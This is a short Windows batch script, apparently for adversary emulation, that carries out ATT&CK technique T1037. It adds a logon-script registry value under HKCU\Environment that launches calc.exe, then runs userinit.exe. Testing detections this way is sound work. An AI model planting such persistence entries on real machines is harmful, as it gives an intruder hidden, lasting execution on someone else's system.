@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Logon Scripts	(T1037)
ECHO.
ECHO [+] Add Registry Key
ECHO     - HKCU\Environment
ECHO -------------------------------------------------------------------
REG.exe add HKCU\Environment /v UserInitLogonScript /t REG_MULTI_SZ /d "cmd.exe /c calc.exe"
ECHO.

ECHO ===========================================================================
ECHO Technique: Logon Scripts	(T1037)
ECHO.
ECHO [+] userinit
ECHO -------------------------------------------------------------------
C:\Windows\System32\userinit.exe
ECHO.
